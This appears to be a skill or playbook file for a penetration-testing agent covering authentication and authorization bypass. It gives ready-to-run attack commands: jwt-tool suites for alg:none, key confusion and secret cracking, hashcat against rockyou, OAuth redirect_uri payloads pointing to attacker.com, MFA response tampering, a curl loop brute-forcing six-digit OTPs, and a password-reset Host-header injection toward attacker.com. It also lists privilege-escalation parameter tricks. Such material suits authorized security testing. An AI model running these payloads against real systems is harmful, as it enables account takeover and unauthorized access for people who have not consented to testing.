# SKILL: Authentication & Authorization Bypass
**Auth bugs = highest severity. Study every login flow deeply.**

---

## SESSION MANAGEMENT

```bash
# Analyze session token entropy
python3 -c "
import base64, binascii
token = '{SESSION_TOKEN}'
try:
    decoded = base64.b64decode(token)
    print('Base64 decoded:', decoded)
except:
    try:
        print('Hex decoded:', binascii.unhexlify(token))
    except:
        print('Length:', len(token), 'chars')
        print('Pattern analysis:', set(token))
"

# Check: is it a JWT? (contains two dots)
# Check: is it sequential/predictable?
# Check: does it contain user data (base64 decode it)
# Check: does the server verify signature or just decode?
```

---

## JWT ATTACKS (see also skills/web-vulns.md)

```bash
# Full JWT attack suite
jwt-tool {TOKEN} --exploit --all

# Specific attacks:
jwt-tool {TOKEN} -X a    # Algorithm none
jwt-tool {TOKEN} -X s    # RS256→HS256 key confusion  
jwt-tool {TOKEN} -X k    # Key injection via JWK header
jwt-tool {TOKEN} -X i    # KID SQL injection
jwt-tool {TOKEN} -X e    # KID path traversal

# Crack HS256 secret
jwt-tool {TOKEN} -C -d /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 16500 {TOKEN} /usr/share/wordlists/rockyou.txt
```

---

## OAUTH 2.0 ATTACKS

```bash
# 1. Redirect URI validation bypass
# Test these as redirect_uri values:
# https://attacker.com
# https://target.com.attacker.com
# https://target.com@attacker.com
# https://target.com/callback/../../../redirect?url=https://attacker.com
# https://target.com%0d%0aattacker.com
# https://attacker.com/target.com

# 2. State parameter missing (CSRF on OAuth)
# Remove state= entirely from authorization request
# Does authorization still complete? → CSRF on OAuth

# 3. PKCE bypass (for mobile/SPA OAuth)
# If PKCE is implemented, test if code_verifier is actually validated

# 4. Authorization code reuse
# Complete OAuth flow, capture code
# Use code again after first use — should fail with "code already used"

# 5. Implicit flow token leakage
# If using implicit flow: fragment (#access_token=...) leaks via Referer header
# Check if the app makes subsequent requests with Referer containing the token
```

---

## MFA BYPASS TECHNIQUES

```bash
# 1. Response manipulation
# Intercept MFA verification response
# Change: {"success": false} → {"success": true}
# Change: status 401 → 200

# 2. OTP brute force (check for rate limiting)
for code in {000000..999999}; do
  resp=$(curl -sk -X POST https://{TARGET}/api/verify-otp \
    -d "{\"otp\":\"$code\",\"token\":\"{SESSION}\"}" \
    -w "%{http_code}")
  if [[ "$resp" != *"invalid"* && "$resp" != "401" ]]; then
    echo "VALID OTP: $code"
    break
  fi
done

# 3. OTP reuse (time-based)
# Use the same TOTP code twice in rapid succession — second should fail

# 4. Backup code rate limiting
# Most apps have less protection on backup codes

# 5. Direct endpoint access after partial auth
# After completing step 1 (password), try accessing authenticated endpoints
# before completing step 2 (MFA) — auth state may already be set in session
```

---

## PASSWORD RESET ATTACKS

```bash
# 1. Host header injection in reset email
curl -sk -X POST https://{TARGET}/api/forgot-password \
  -H "Host: attacker.com" \
  -d '{"email":"victim@example.com"}'
# If reset link goes to attacker.com → steal token

# 2. Token predictability
# Request reset for your account 3 times
# Analyze tokens for pattern: sequential? time-based? MD5(email+timestamp)?

# 3. Token reuse after password change
# Request reset → reset password → try using old token → should fail

# 4. Token expiry (should expire after use AND after time)
# Request reset → wait 25 hours → try token → should fail

# 5. Cross-account token usage
# Request reset for account A
# Change email parameter to account B in the reset link
# Does it reset account B? → Token not bound to account

# 6. Username case normalization
# admin@example.com vs ADMIN@example.com — does app treat as same account?
# Unicode normalization: ℯxample.com vs example.com (confusable chars)
```

---

## PRIVILEGE ESCALATION PATTERNS

```bash
# 1. Role/permission in JWT — modify and re-sign (if weak secret)
# Decode JWT, change "role":"user" to "role":"admin", crack+resign or use alg:none

# 2. Cookie/param manipulation
# isAdmin=0 → isAdmin=1
# role=user → role=administrator
# plan=free → plan=enterprise

# 3. Forced browsing to admin endpoints
# Try /admin, /dashboard/admin, /api/admin/users, /manage, /console
# Even 403 responses worth noting — endpoint exists, just blocked

# 4. HTTP method override
# If admin action is DELETE, try with POST + X-HTTP-Method-Override: DELETE
# If endpoint is GET-only, try: X-HTTP-Method: POST

# 5. Parameter pollution for role bypass
# POST /api/user/update?role=admin
# POST body: {"role": "user"}
# Which does the server use?
```
